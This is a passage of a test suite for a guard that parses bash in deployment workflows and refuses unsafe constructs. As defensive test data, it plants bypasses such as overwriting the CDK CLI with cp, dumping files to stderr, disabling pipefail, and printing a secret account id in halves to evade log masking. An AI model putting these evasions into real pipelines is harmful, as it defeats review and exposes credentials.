      `${GUARD}: DPW-10 ASSET_CHECK, line ${lineOf(planted, check)}: ${EVALUATES}`,
    )
    // bash evaluates each argument as an expression, a subscript's command substitution included.
    const ran = bash(
      `f() { local v; for v; do [ "$(( v ))" -le 8 ] || return 1; done; echo held; }; f 6 'BASH_VERSINFO[$(echo ran >&2; echo 0)]*0'`,
    )
    expect([ran.stderr.trim(), ran.stdout.trim()]).toEqual(['ran', 'held'])
    expect(canonicalTextFindings()).toEqual([])
  })

  // bash starts a command after a then, do, else or elif that follows a compound command's ]], ) or } with no ;,
  // after for NAME do, and in a function whose body is a compound command other than { … }: the reader read no
  // command there, so a held tool beyond its held line, or a program the list doesn't name, ran unread.
  it('refuses a command where bash starts one and the reader reads none', () => {
    for (const text of [
      'if [[ -n "$x" ]] then grep a b; fi',
      'if (true) then grep a b; fi',
      'if { true; } then grep a b; fi',
      'while (true) do grep a b; break; done',
      'if [[ -n "$x" ]]; then :; elif [[ -n "$y" ]] then grep a b; fi',
      'for part do grep a b; done',
      'f() while grep a b; do break; done',
      'f() until grep a b; do break; done',
      'f() if grep a b; then :; fi',
      'f() case "$x" in *) grep a b ;; esac',
      'function f while grep a b; do break; done',
    ]) {
      expect(readsAsBash(text), text).toBe(false)
    }
    for (const text of [
      'if [[ -n "$x" ]]; then grep a b; fi',
      'while true; do grep a b; break; done',
      'for part in a b; do grep a b; done',
      'f() { grep a b; }',
      'f () {\n  grep a b\n}',
      'function f { grep a b; }',
      'function f() { grep a b; }',
    ]) {
      expect(readsAsBash(text), text).toBe(true)
    }
    const anchor = "  local step=$1 PART answer status basis=''\n"
    for (const added of [
      `  plan_peek() while ${grep}; do break; done\n  plan_peek\n`,
      `  if [[ -n "$step" ]] then ${grep}; fi\n`,
      `  for part do ${grep}; done\n`,
    ]) {
      expect(
        canonicalTextFindings({ PLAN_BASIS: replaced(PLAN_BASIS, [anchor, `${anchor}${added}`]) }),
        added,
      ).toContain(`${GUARD}: DPW-10 PLAN_BASIS: is written in the shell shellViews() reads`)
    }
    // bash runs each.
    const ran = bash(
      'if [[ -n x ]] then echo one; fi\nf() while echo two; do break; done\nf\nset -- a; for p do echo three; done',
    )
    expect(ran.stdout.split('\n').filter(Boolean)).toEqual(['one', 'two', 'three'])
  })

  // >| is the noclobber redirection, whose | the reader took for a pipe, so a [[ as its target read as a test at a
  // command's start and blanked what bash ran up to the next ]].
  it('reads the | of >| as a redirection’s, never a pipe', () => {
    expect(shellCommands('echo "$HEAD" >|[[ ; grep a b; [[ -n "$HEAD" ]]').map(command => command.word)).toContain(
      'grep',
    )
    const anchor = "OPENED='[]'\n"
    const added = 'echo "$HEAD" >|[[ ; grep -o . "$RUNNER_TEMP/checks.json" >&2; [[ -n "$HEAD" ]]\n'
    const planted = replaced(PULL_CHECKS, [anchor, `${anchor}${added}`])
    expect(canonicalTextFindings({ PULL_CHECKS: planted })).toContain(
      `${GUARD}: DPW-10 PULL_CHECKS, line ${lineOf(planted, added.trimEnd())}: ${PROCESS_TOOL}`,
    )
    const folder = mkdtempSync(join(tmpdir(), 'hearth-clobber-'))
    try {
      const ran = bash('HEAD=x; echo "$HEAD" >|[[ ; echo ran; [[ -n "$HEAD" ]]', folder)
      expect(ran.stdout.trim()).toBe('ran')
      expect(existsSync(join(folder, '[['))).toBe(true)
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })

  // A verdict's status taken by ||: the CLI's deploy line or smoke.ts's in a group followed by || STATUS=$? (the
  // diff runs' own idiom, but with no exit "$STATUS" after) or || echo went on green, since bash lifts set -e from
  // what stands left of an ||; so a failed deploy went on to migrate and Services, and a failed smoke started no
  // rollback and recorded the release.
  it('runs each deploy of the CLI and smoke.ts standing alone, so its failure ends the step (DPW-06)', () => {
    const verdict = (id: string) => `${DEPLOY}: DPW-06 ${id}: ${VERDICT_ALONE}`
    const wrapped = (line: string, after: string) =>
      `          STATUS=0\n          {\n${line}          } || STATUS=$?\n          ${after}\n`
    const forward = `          ${CDK_DEPLOY_FORWARD}\n`
    const smoke = `          node infra/scripts/deploy/smoke.ts "\${STAGE_FLAGS[@]}" --release "$RELEASE" --readback "$RUNNER_TEMP/readback.json" --profile-at "$PROFILE_AT"\n`
    for (const [what, id, from, to] of [
      [
        'the forward deploy, its status kept',
        'nonprod',
        forward,
        wrapped(forward, 'echo "deploy: the CLI exited $STATUS" | mask | tee -a "$GITHUB_STEP_SUMMARY"'),
      ],
      [
        'the forward deploy, || echo',
        'prod',
        forward,
        `          {\n${forward}          } || echo 'deploy: failed' | mask\n`,
      ],
      [
        'the forward deploy, an if on its own line',
        'nonprod',
        forward,
        `          if\n${forward}          then :; fi\n`,
      ],
      [
        'Services',
        'prod',
        `          ${CDK_DEPLOY_SERVICES}\n`,
        wrapped(`          ${CDK_DEPLOY_SERVICES}\n`, 'echo done | mask'),
      ],
      [
        "the pipeline's rollback",
        'rollback-nonprod',
        `          ${CDK_DEPLOY_ROLLBACK}\n`,
        wrapped(`          ${CDK_DEPLOY_ROLLBACK}\n`, 'echo done | mask'),
      ],
      [
        'the smoke',
        'smoke-nonprod',
        smoke,
        wrapped(smoke, 'echo "smoke: smoke.ts exited $STATUS" >>"$GITHUB_STEP_SUMMARY"'),
      ],
      [
        'the resmoke',
        'resmoke-prod',
        smoke,
        `          ${smoke.trim()} || echo 'smoke: failed' >>"$GITHUB_STEP_SUMMARY"\n`,
      ],
    ] as const) {
      expect(deployStepFindings(plant(from, to, job(id))), what).toContain(verdict(id))
    }
    expect(deployStepFindings(workflows).filter(each => each.endsWith(VERDICT_ALONE))).toEqual([])
    // A subshell around one is no form the table reads, which refuses the run (DPW-07 in a job without credentials).
    expect(
      maskingFindings(plant(smoke, `          ( ${smoke.trim()} ) || true\n`, job('resmoke-prod'))).some(
        each => each.startsWith(`${DEPLOY}: DPW-07 resmoke-prod (Smoke)`) && each.endsWith(AS_BASH),
      ),
    ).toBe(true)
    // Each CLI step as committed, with a stand-in CLI that fails as the CDK CLI does when an update rolls back,
    // ends its step with that status; the group form the guard now refuses ends it green.
    const pinned = PINNED_RUNS()
    const runWith = (run: string, stage: string) => {
      const folder = mkdtempSync(join(tmpdir(), 'hearth-verdict-'))
      try {
        execFileSync('mkdir', ['-p', join(folder, 'aws-cdk/package/bin')])
        writeFileSync(
          join(folder, 'aws-cdk/package/bin/cdk'),
          `#!/bin/bash\necho "cdk $1" >>"${folder}/calls"\nexit 1\n`,
          {
            mode: 0o755,
          },
        )
        for (const file of ['summary', 'output']) writeFileSync(join(folder, file), '')
        const ran = spawnSync('bash', ['--noprofile', '--norc', '-eo', 'pipefail', '-c', run], {
          encoding: 'utf8',
          env: {
            PATH: process.env.PATH ?? '',
            RUNNER_TEMP: folder,
            STAGE: stage,
            GITHUB_STEP_SUMMARY: join(folder, 'summary'),
            GITHUB_OUTPUT: join(folder, 'output'),
          },
        })
        return {
          status: ran.status,
          calls: existsSync(join(folder, 'calls')) ? readFileSync(join(folder, 'calls'), 'utf8') : '',
        }
      } finally {
        rmSync(folder, { recursive: true, force: true })
      }
    }
    for (const [id, step] of [
      ['nonprod', 'Deploy Platform, Data and Tasks'],
      ['nonprod', 'Deploy Services'],
      ['nonprod', 'Roll back to the target'],
      ['rollback-nonprod', 'Roll back Tasks and Services'],
      ['prod', 'Deploy Platform, Data and Tasks'],
      ['prod', 'Deploy Services'],
      ['prod', 'Roll back to the target'],
      ['rollback-prod', 'Roll back Tasks and Services'],
    ] as const) {
      const run = pinned[id]?.[step]?.run ?? ''
      expect(runWith(run, id.replace('rollback-', '')), `${id} ${step}`).toEqual({ status: 1, calls: 'cdk deploy\n' })
    }
    const group = FORWARD_RUN.replace(
      CDK_DEPLOY_FORWARD,
      `STATUS=0\n{\n${CDK_DEPLOY_FORWARD}\n} || STATUS=$?\necho "deploy: the CLI exited $STATUS"`,
    )
    expect(runWith(group, 'nonprod')).toEqual({ status: 0, calls: 'cdk deploy\n' })
    // Each smoke as committed, with a stand-in node that fails, ends its step with that status.
    for (const id of ['smoke-nonprod', 'smoke-prod', 'resmoke-nonprod', 'resmoke-prod'] as const) {
      const folder = mkdtempSync(join(tmpdir(), 'hearth-verdict-'))
      try {
        execFileSync('mkdir', ['-p', join(folder, 'bin')])
        writeFileSync(join(folder, 'bin/node'), '#!/bin/bash\nexit 1\n', { mode: 0o755 })
        const ran = spawnSync('bash', ['--noprofile', '--norc', '-eo', 'pipefail', '-c', smokeRun(id)], {
          encoding: 'utf8',
          env: {
            PATH: `${join(folder, 'bin')}:${process.env.PATH ?? ''}`,
            RUNNER_TEMP: folder,
            ATTEMPT: '1',
            GITHUB_RUN_ATTEMPT: '1',
            READBACK: '{}',
            RELEASE: `${'a'.repeat(40)}:sha256:${'b'.repeat(64)}`,
            PROFILE_AT: 'a'.repeat(40),
            MODE: 'deploy',
            TARGET: 'prod',
            RESTORE: '',
          },
        })
        expect(ran.status, id).toBe(1)
      } finally {
        rmSync(folder, { recursive: true, force: true })
      }
    }
  }, 120_000)

  // A canonical text's refusal ending its step with status 0: PROBE's last call in ( … ) || echo turned the probe
  // task's exit 1 into a step that passed, and a refusal's echo "…" | mask then a bare exit ended the step with
  // mask's 0. The glue's table held exit to one argument; a canonical text's own were held by nothing.
  it('ends a canonical text only with a literal status and opens no subshell where a command starts (DPW-10)', () => {
    const call = 'one_off_end probe "$PROBE_LINES" "$RUN"'
    const subshell = replaced(PROBE, [
      call,
      `(\n${call}\n) || echo "probe: the probe failed; the smoke judges the release" | mask`,
    ])
    expect(canonicalTextFindings({ PROBE: subshell })).toContain(
      `${GUARD}: DPW-10 PROBE, line ${lineOf(subshell, '(')}: ${VERDICT_RULE}`,
    )
    const bare = PROBE.replace(/\n(\s*)exit 1\n/, '\n$1exit\n')
    expect(bare).not.toBe(PROBE)
    expect(canonicalTextFindings({ PROBE: bare }).some(each => each.endsWith(VERDICT_RULE))).toBe(true)
    for (const [text, lines] of [
      ['exit 1', []],
      ['exit 0', []],
      ['f() { g || return; }', []],
      ['f() { return 1; }', []],
      ['exit', [0]],
      ['exit "$status"', [0]],
      ['f() { echo x; return; }', [0]],
      ['( exit 1 ) || true', [0]],
      ['true && (grep a b)', [0]],
      ['x=$((1 + 2))', []],
      ['(( x > 1 )) || true', []],
    ] as const) {
      expect(verdictLines(text), text).toEqual(lines)
    }
    // The probe's step as committed, with a stand-in aws whose probe task exits 1, ends with exit 1; the subshell
    // form ends it with 0.
    const arn = ['arn', 'aws', 'ecs', 'ap-southeast-1', '0'.repeat(12)].join(':')
    const aws = `#!/bin/bash
A=${arn}
T=$A:task/hearth-nonprod/${'0123456789abcdef'.repeat(2)}
all="$*"
case "$1 $2" in
  'cloudformation describe-stacks')
    printf '[{"OutputKey":"Cluster","OutputValue":"hearth-nonprod"},{"OutputKey":"IsolatedSubnets","OutputValue":"subnet-0123456789abcdef0"},{"OutputKey":"MigrateSecurityGroup","OutputValue":"sg-0123456789abcdef0"},{"OutputKey":"ProbeSecurityGroup","OutputValue":"sg-0123456789abcdef1"},{"OutputKey":"HasDatabase","OutputValue":"true"},{"OutputKey":"MigrateTaskDefinition","OutputValue":"%s:task-definition/hearth-nonprod-migrate:3"},{"OutputKey":"ProbeTaskDefinition","OutputValue":"%s:task-definition/hearth-nonprod-probe:3"}]\\n' "$A" "$A" ;;
  'ecs describe-services') echo '{"desired": 1, "deployment": "ecs-svc/123"}' ;;
  'ecs list-tasks') printf '["%s"]\\n' "$T" ;;
  'ecs describe-tasks')
    case "$all" in
      *'exit: containers[0].exitCode'*) echo '{"exit": 1, "stop": "EssentialContainerExited"}' ;;
      *) echo '["10.0.1.10"]' ;;
    esac ;;
  'ecs run-task') printf '{"failures": 0, "tasks": ["%s"]}\\n' "$T" ;;
  'ecs wait') ;;
  'logs get-log-events') echo '{"events": ["api 1 503 -", "probe: failed"], "next": "f/1"}' ;;
  *) echo "stand-in aws: no answer for $*" >&2; exit 2 ;;
esac
`
    const probe = (run: string) => {
      const folder = mkdtempSync(join(tmpdir(), 'hearth-probe-'))
      try {
        execFileSync('mkdir', ['-p', join(folder, 'bin')])
        writeFileSync(join(folder, 'bin/aws'), aws, { mode: 0o755 })
        for (const file of ['summary', 'output']) writeFileSync(join(folder, file), '')
        return spawnSync('bash', ['--noprofile', '--norc', '-eo', 'pipefail', '-c', run], {
          encoding: 'utf8',
          env: {
            PATH: `${join(folder, 'bin')}:${process.env.PATH ?? ''}`,
            HOME: folder,
            RUNNER_TEMP: folder,
            STAGE: 'nonprod',
            GITHUB_STEP_SUMMARY: join(folder, 'summary'),
            GITHUB_OUTPUT: join(folder, 'output'),
            GITHUB_RUN_ID: '1',
            GITHUB_RUN_ATTEMPT: '1',
          },
        }).status
      } finally {
        rmSync(folder, { recursive: true, force: true })
      }
    }
    const committed = probeRun('nonprod', 'deploy')
    expect(probe(committed)).toBe(1)
    expect(committed).toContain(call)
    expect(probe(committed.replace(call, `(\n${call}\n) || echo "probe: failed" | mask`))).toBe(0)
    expect(canonicalTextFindings()).toEqual([])
  }, 120_000)

  // A record written from github.sha, the run's commit, which the gate's commit equals on every push: in a
  // dispatched rollback the record named main's head with the target's image, and the next deploy's expansion
  // check read that commit.
  it('records what its smokes judged, read from the workflow’s own env (DPW-13)', () => {
    const JUDGED =
      "records what its smokes judged: COMMIT:DIGEST its smoke's RELEASE and SERVICES the services of the job whose read-back that smoke read, PREVIOUS_COMMIT:PREVIOUS_DIGEST and ROLLBACK_SERVICES its resmoke's the same way, and SMOKE and RESMOKE that smoke's and resmoke's results"
    const judged = (id: string) => `${DEPLOY}: DPW-13 ${id} (Write the record): ${JUDGED}`
    const found = (planted: ReadonlyMap<string, string>) => releaseFindings(planted)
    for (const [stage, from, to] of [
      ['nonprod', `COMMIT: \${{ needs.gate.outputs.commit }}`, `COMMIT: \${{ github.sha }}`],
      ['prod', `COMMIT: \${{ needs.gate.outputs.commit }}`, `COMMIT: \${{ github.sha }}`],
      ['nonprod', `DIGEST: \${{ needs.nonprod.outputs.digest }}`, `DIGEST: \${{ needs.build.outputs.digest }}`],
      [
        'prod',
        `SERVICES: \${{ needs.prod.outputs.services }}`,
        `SERVICES: \${{ needs.rollback-prod.outputs.services }}`,
      ],
      [
        'nonprod',
        `PREVIOUS_COMMIT: \${{ needs.gate.outputs.previous_nonprod_commit }}`,
        `PREVIOUS_COMMIT: \${{ needs.gate.outputs.current_nonprod }}`,
      ],
      [
        'prod',
        `ROLLBACK_SERVICES: \${{ needs.rollback-prod.outputs.services }}`,
        `ROLLBACK_SERVICES: \${{ needs.prod.outputs.services }}`,
      ],
    ] as const) {
      expect(
        found(plant(`          ${from}\n`, `          ${to}\n`, job(`record-${stage}`))),
        `${stage} ${to}`,
      ).toContain(judged(`record-${stage}`))
    }
    expect(found(workflows).filter(each => each.endsWith(JUDGED))).toEqual([])
  })
})

// Round 12's third iteration, its second pass: the gaps the finders proved past the reader and the rules after the
// fourth iteration's fixes, each planted as they planted it and found at its root.
describe('Round 12, iteration 3, its second pass: the ways past the reader and the rules (DPW-10)', () => {
  const bash = (script: string) => spawnSync('bash', ['--noprofile', '--norc', '-c', script], { encoding: 'utf8' })
  const replaced = (text: string, ...pairs: ReadonlyArray<readonly [string, string]>) =>
    pairs.reduce((each, [from, to]) => {
      expect(each.split(from).length - 1, from).toBe(1)
      return each.replace(from, to)
    }, text)
  const lineOf = (text: string, line: string) => text.split('\n').indexOf(line) + 1
  const atLine = (name: string, text: string, line: string) => `${GUARD}: DPW-10 ${name}, line ${lineOf(text, line)}: `
  const VERDICT =
    'exits or returns only with a literal status (a bare return only after ||, which returns the failing command’s), opens no subshell where a command starts and refuses inside no substitution (no exit, and no call of a function that exits, in a $( … ), <( … ) or >( … )), so no refusal ends its step with status 0 or a subshell alone'
  const STREAM =
    "hands jq -e no stream of values: it reads one file or a here-string on its own command, unless it is given -n or -s, and never its standard input otherwise (a pipe, a group, a function's caller, < <( … )) or more than one file, since -e reads the last value it reads alone"

  // A case pattern [[:lower:]_]*) glues [[ to its word, so bash reads a pattern; the reader read a test from it to the
  // next ]] on its line, past the pattern's ), and then the pattern on to the next unmatched ) anywhere: every
  // command bash ran in between, lines after the esac among them, was seen by no rule. A pattern list holding the
  // word [[ did the same. A test now starts only at the word [[, and a pattern holding the word is refused.
  it('reads a test only at the word [[, and refuses a case pattern holding the word, so no pattern hides a command', () => {
    const anchor = "  local step=$1 PART answer status basis=''"
    const plant = (lines: string) => replaced(PLAN_BASIS, [anchor, `${anchor}\n${lines}`])
    const grep = '  grep -o . "$RUNNER_TEMP/aws-cdk/package/package.json" >&2'
    const inCase = (item: string) => `  case "$step" in\n    ${item}\n  esac`
    const hidden = (planted: string, line: string) =>
      canonicalTextFindings({ PLAN_BASIS: planted }).some(each => each.startsWith(atLine('PLAN_BASIS', planted, line)))
    // The grep in the item, on the pattern's line.
    for (const pattern of ['[[:lower:]_]*)', '[[c]heck)', 'plan) : ;; [[a-z]*)', 'plan | [[a-z]*)', '( [[a-z]*)']) {
      const item = `${pattern} grep -o . "$RUNNER_TEMP/aws-cdk/package/package.json" >&2; : ]] ;;`
      const planted = plant(inCase(item))
      expect(hidden(planted, `    ${item}`), pattern).toBe(true)
    }
    // The grep, a cat and a set +o pipefail on lines of their own after the esac.
    for (const after of [grep, '  cat "$RUNNER_TEMP/aws-cdk/package/package.json" >&2', '  set +o pipefail']) {
      const planted = plant(`${inCase('[[:lower:]_]*) [[ -n "$step" ]] ;;')}\n${after}`)
      expect(hidden(planted, after), after).toBe(true)
    }
    // A refusal's bare exit lines after the pattern, the verdict rule's idiom.
    const bare = plant(
      `${inCase('[[:lower:]_]*) [[ "$step" =~ ^[a-z]+$ ]] || exit 1 ;;')}\n  if [ "$step" = check ] && [ -z "$BASIS" ]; then\n    echo "plan-basis: prod-plan's basis is missing" | mask\n    exit\n  fi`,
    )
    expect(canonicalTextFindings({ PLAN_BASIS: bare })).toContain(`${atLine('PLAN_BASIS', bare, '    exit')}${VERDICT}`)
    // The word [[ in a pattern list: bash reads it as a pattern, so the text is refused whole.
    for (const pattern of ['[[ | [a-z]*)', 'plan) : ;; [[ | [a-z]*)', '( [[ | [a-z]*)', '[a-z]* | [[ )']) {
      const planted = plant(inCase(`${pattern} grep -o . "$RUNNER_TEMP/aws-cdk/package/package.json" >&2; : ]] ;;`))
      expect(readsAsBash(planted), pattern).toBe(false)
    }
    const caseWord = bash('case "[[" in [[ ) echo pattern ;; esac')
    expect(caseWord.stdout.trim()).toBe('pattern')
    // A test where a command starts, and a POSIX class in a pattern that closes as a test would, read as before.
    expect(readsAsBash(plant(inCase('[[:lower:]]*) [[ -n "$step" ]] ;;')))).toBe(true)
    expect(readsAsBash(plant('  [[ -n "$step" ]] || exit 1'))).toBe(true)
    expect(canonicalTextFindings()).toEqual([])
  })

  // jq -e reads the last value it reads alone, and JQ_PIPED_RULE holds it to one file or a here-string on its own
  // command; the reader took a process substitution for a redirection and dropped it, so a <( … ) after the one
  // file counted as none, and a here-string counted as jq's input though a later < <( … ) replaced it.
  it('counts a process substitution as a file, and a here-string only as the last input on descriptor 0', () => {
    const missing = `    jq -e '(.missing // []) | length == 0' "$dir/manifest.json" >/dev/null 2>&1 ||`
    const psubFile = replaced(ASSET_CHECK, [
      missing,
      `    jq -e '(.missing // []) | length == 0' "$dir/manifest.json" <(echo '{}') >/dev/null 2>&1 ||`,
    ])
    expect(canonicalTextFindings({ ASSET_CHECK: psubFile })).toContain(
      `${atLine('ASSET_CHECK', psubFile, missing.replace(' >/dev/null', " <(echo '{}') >/dev/null"))}${STREAM}`,
    )
    const counts = `      jq -e '(.counts | length) == 3' <<<"$out" >/dev/null || aws_refuse 'a service is missing'`
    for (const line of [
      `      jq -e '(.counts | length) == 3' <<<"$out" < <(echo '{"counts": [1, 1, 1]}') >/dev/null || aws_refuse 'a service is missing'`,
      `      jq -e '(.counts | length) == 3' <<<"$out" 0<&3 >/dev/null || aws_refuse 'a service is missing'`,
      `      jq -e '(.counts | length) == 3' 5<<<"$out" >/dev/null || aws_refuse 'a service is missing'`,
    ]) {
      const planted = replaced(AWS_CHECK, [counts, line])
      expect(jqPipedLines(planted), line).toEqual([lineOf(planted, line) - 1])
    }
    // A process substitution alone beside the here-string is a file of no held shape.
    const psubOnly = `      jq -e '(.counts | length) == 3' <(echo '{"counts": [1, 1, 1]}') <<<"$out" >/dev/null || aws_refuse 'a service is missing'`
    const planted = replaced(AWS_CHECK, [counts, psubOnly])
    expect(canonicalToolLines(planted)).toContain(lineOf(planted, psubOnly) - 1)
    // bash hands jq the substitution as a file and reads the last redirection of descriptor 0.
    expect(bash(`jq -e '. == 1' <(echo 2) <<<1 >/dev/null; echo "$?"`).stdout.trim()).toBe('1')
    expect(bash(`jq -e '. == 1' <<<1 < <(echo 2) >/dev/null; echo "$?"`).stdout.trim()).toBe('1')
    expect(jqPipedLines(AWS_CHECK)).toEqual([])
    expect(jqPipedLines(ASSET_CHECK)).toEqual([])
  })

  // A refusal inside a substitution handed to a command as its argument ends that subshell alone: bash clears
  // errexit there, and the command's status (0 for : or echo) is what set -e sees. So : "$([ … ] || aws_refuse …)"
  // went on past AWS_CHECK's refusal, and TASKS_OUTPUTS' shape check in : "$( … )" handed aws a cluster of any
  // shape. A substitution now holds no exit and no call of a function that exits, itself or through another.
  it('refuses an exit, or a call of a function that exits, inside a substitution', () => {
    const open = `    [ "$status" != UPDATE_ROLLBACK_FAILED ] ||`
    const refusal = `      aws_refuse "the Services stack is UPDATE_ROLLBACK_FAILED (an update whose rollback failed), which waits for tier 2 (deploy-and-rollback.md)"`
    for (const [opened, closed] of [
      [`    : "$([ "$status" != UPDATE_ROLLBACK_FAILED ] ||`, `${refusal})"`],
      [`    echo "$([ "$status" != UPDATE_ROLLBACK_FAILED ] ||`, `${refusal})" | mask`],
    ] as const) {
      const planted = replaced(AWS_CHECK, [open, opened], [refusal, closed])
      expect(canonicalTextFindings({ AWS_CHECK: planted }), opened).toContain(
        `${atLine('AWS_CHECK', planted, opened)}${VERDICT}`,
      )
    }
    const shape = '  if [ "$CLUSTER" != "hearth-$STAGE" ]'
    const tasks = replaced(
      TASKS_OUTPUTS,
      [shape, '  : "$(if [ "$CLUSTER" != "hearth-$STAGE" ]'],
      ['    exit 1\n  fi\n', '    exit 1\n  fi)"\n'],
    )
    const tasksLine = tasks.split('\n').find(line => line.startsWith('  : "$(if [ "$CLUSTER"')) ?? ''
    expect(canonicalTextFindings({ TASKS_OUTPUTS: tasks })).toContain(
      `${atLine('TASKS_OUTPUTS', tasks, tasksLine)}${VERDICT}`,
    )
    const refuses = new Set(['refuse', 'check'])
    for (const [text, lines] of [
      [': "$(exit 1)"', [0]],
      ['echo "$(refuse)"', [0]],
      ['x=$(check a)', [0]],
      ['cat <(refuse)', [0]],
      ['x=$(get a)', []],
      ['x=$((1 + 2))', []],
      ['while read -r a; do :; done < <(list "$x")', []],
    ] as const) {
      expect(verdictLines(text, refuses), text).toEqual(lines)
    }
    // A function that exits through another is one too, and one that returns is not.
    expect([
      ...exitingFunctions(['a() { exit 1; }\nb() { a "$1"; }\nc() { return 1; }\nd() { echo "$(c)"; }']),
    ]).toEqual(['a', 'b'])
    // bash: the exit ends the substitution alone, and : passes.
    expect(bash('set -e; : "$(exit 1)"; echo went on').stdout.trim()).toBe('went on')
    expect(canonicalTextFindings()).toEqual([])
  })
})

// Round 12's fourth iteration, its second pass: the gaps the finders proved past the reader and the rules after the
// third iteration's second pass, each planted as they planted it and found at its root.
describe('Round 12, iteration 4, its second pass: the ways past the reader and the rules (DPW-04, DPW-06, DPW-07, DPW-10, DPW-13)', () => {
  const COMMANDS =
    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
  const EXPANDS =
    "expands only a name a canonical text sets, one its step's or job's env: gives from no secret or token (but ASSEMBLY_FOLDER, which only an asset check's own calls read), the one-offs' TOKEN, the assembly's folder, prod-plan's diff file, or the runner's outputs, summary, folder, run ids, address and commit, so no canonical text prints the OIDC request token or another credential its job holds"
  const VERDICT =
    'exits or returns only with a literal status (a bare return only after ||, which returns the failing command’s), opens no subshell where a command starts and refuses inside no substitution (no exit, and no call of a function that exits, in a $( … ), <( … ) or >( … )), so no refusal ends its step with status 0 or a subshell alone'
  const WRITES = "writes no file but its outputs, its summary, prod-plan's diff and /dev/null"
  const DIFF_FORM =
    'ends each diff run with exit "$STATUS" standing alone, its only exit, wraps each diff line in { … } >"$DIFF" || STATUS=$? (a down diff’s in { … } >>"$DIFF" || { DOWN_STATUS=$?; break; }), and sets STATUS and DOWN_STATUS only as the diff runs do, so a failed diff fails prod-plan'
  const UNREAD =
    'hands a jq given -n no data, no file, here-string, input redirection or pipe, since it reads none of it and checks null'
  const APPENDS =
    'writes the job summary and its outputs only by appending (>> or tee -a), expanding either file’s name only as that whole target or operand, so no write erases what the step wrote there before'
  const JUDGED =
    "records what its smokes judged: COMMIT:DIGEST its smoke's RELEASE and SERVICES the services of the job whose read-back that smoke read, PREVIOUS_COMMIT:PREVIOUS_DIGEST and ROLLBACK_SERVICES its resmoke's the same way, and SMOKE and RESMOKE that smoke's and resmoke's results"
  const bash = (script: string, env: Record<string, string> = {}) =>
    spawnSync('bash', ['--noprofile', '--norc', '-c', script], { encoding: 'utf8', env: { ...process.env, ...env } })
  const replaced = (text: string, ...pairs: ReadonlyArray<readonly [string, string]>) =>
    pairs.reduce((each, [from, to]) => {
      expect(each.split(from).length - 1, from).toBe(1)
      return each.replace(from, to)
    }, text)
  const lineOf = (text: string, line: string) => text.split('\n').indexOf(line) + 1
  // deploy.yml with one exact edit inside one step's lines.
  const inStep = (jobId: string, name: string, from: string, to: string) => {
    const step = stepText(deployText, jobId, name)
    return withText(DEPLOY, edited(deployText, step, replaced(step, [from, to]), job(jobId)))
  }
  const BASIS_ANCHOR = "  local step=$1 PART answer status basis=''"

  // An append before a command's word (NAME+=), or redirections written with no blank between them, read as no
  // prefix: the reader took the assignment or the descriptor for the command's word, so the cp onto the CLI, or
  // the source of the assembly's file, bash ran after it was read by no command rule.
  it('reads the command after an append or after redirections written together (DPW-10)', () => {
    for (const line of [
      `  basis+='' cp "$RUNNER_TEMP/assembly/manifest.json" "$RUNNER_TEMP/aws-cdk/package/bin/cdk"`,
      `  basis+='' . "$RUNNER_TEMP/assembly/manifest.json"`,
      `  >&2<<<x . "$RUNNER_TEMP/assembly/manifest.json"`,
      `  2>&1>&2 grep -o . "$RUNNER_TEMP/aws-cdk/package/package.json"`,
      `  <<<x>&2 grep -o . "$RUNNER_TEMP/aws-cdk/package/package.json"`,
      `  basis+='' set +e`,
    ]) {
      const planted = replaced(PLAN_BASIS, [BASIS_ANCHOR, `${BASIS_ANCHOR}\n${line}`])
      expect(canonicalTextFindings({ PLAN_BASIS: planted }), line).toContain(
        `${GUARD}: DPW-10 PLAN_BASIS, line ${lineOf(planted, line)}: ${COMMANDS}`,
      )
    }
    for (const [text, word] of [
      ["x+='' cp a b", 'cp'],
      ['>&2<<<x . f', '.'],
      ['2>&1>&2 grep x', 'grep'],
      ['<<<x>&2 grep x', 'grep'],
      ['>a<b cat', 'cat'],
    ] as const) {
      expect(
        shellCommands(text).map(command => command.word),
        text,
      ).toEqual([word])
    }
    // bash runs both.
    expect(bash('x+=1 printenv x').stdout.trim()).toBe('1')
    expect(bash('>/dev/null<<<x echo ran >&2').stderr.trim()).toBe('ran')
    expect(canonicalTextFindings()).toEqual([])
  })

  // A canonical text that set a name a step's env: gives from a secret (ACCOUNT_ID="${ACCOUNT_ID:-}", the ordinary
  // set -u default) made it a name of its own, so the push's account id could be printed in two halves, which no
  // mask matches.
  it('lets no text make a secret’s name its own by setting it (DPW-07)', () => {
    const anchor = 'CDK="$RUNNER_TEMP/aws-cdk/package/bin/cdk"'
    const print = `echo "account \${ACCOUNT_ID%??????} \${ACCOUNT_ID#??????}"`
    const planted = replaced(PREAMBLE, [anchor, `${anchor}\nACCOUNT_ID="\${ACCOUNT_ID:-}"\n${print}`])
    expect(canonicalTextFindings({ PREAMBLE: planted })).toContain(
      `${GUARD}: DPW-07 PREAMBLE, line ${lineOf(planted, print)}: ${EXPANDS}`,
    )
    expect(foreignExpansionLines(`echo "\${ACCOUNT_ID%??????}"`, ['ACCOUNT_ID'])).toEqual([0])
    expect(foreignExpansionLines('echo "$x"', ['x'])).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
  })

  // A plain count of every { and } closed a function's body at : ${step:-\}} or : }, so an exit after it was read
  // as outside the function and its call in a substitution passed, swallowed by :'s status 0.
  it('reads a function’s body to the } that closes it as bash does (DPW-10)', () => {
    const argument = 'plan_refuse() {\n  : }\n  echo "$1"\n  exit 1\n}'
    expect([...exitingFunctions([argument])]).toEqual(['plan_refuse'])
    expect([...exitingFunctions([`a() {\n  : "\${x:-}" }\n  exit 1\n}`])]).toEqual(['a'])
    const escaped = `plan_refuse() {\n  : \${step:-\\}}\n  exit 1\n}`
    expect([...exitingFunctions([escaped])]).toEqual(['plan_refuse'])
    expect(readsAsBash(escaped)).toBe(false)
    const call = `  : "$([ -n "$BASIS" ] || [ "$step" = plan ] || plan_refuse "prod-plan's basis is missing")"`
    for (const body of ['  : }', `  : "\${x:-}" }`]) {
      const planted = replaced(PLAN_BASIS, [
        BASIS_ANCHOR,
        `${BASIS_ANCHOR}\n  plan_refuse() {\n${body}\n    echo "plan-basis: $1"\n    exit 1\n  }\n${call}`,
      ])
      expect(canonicalTextFindings({ PLAN_BASIS: planted }), body).toContain(
